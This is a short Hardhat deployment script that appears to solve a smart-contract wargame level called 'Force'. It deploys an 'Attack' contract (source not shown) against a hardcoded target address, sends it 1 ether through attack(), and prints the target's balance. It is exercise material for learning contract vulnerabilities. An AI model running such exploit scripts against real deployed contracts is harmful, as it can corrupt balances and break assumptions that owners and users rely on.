import { ethers } from 'hardhat';

const CONTRACT_ADDRESS = '0x4a057D0eaA196191D22150F22EbBA8703E8ce165';
const PLAYER_ADDRESS = '0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199';

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);

  const contract = await ethers.getContractAt(
    'Force',
    CONTRACT_ADDRESS,
    signer,
  );

  const Attack = await ethers.getContractFactory('Attack');
  const attack = await Attack.deploy(CONTRACT_ADDRESS);

  const tx = await attack.attack({
    value: ethers.utils.parseEther('1.0'),
  });

  // check the balance of the contract address
  console.log(
    'Contract balance:',
    (await contract.provider.getBalance(CONTRACT_ADDRESS)).toString(),
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
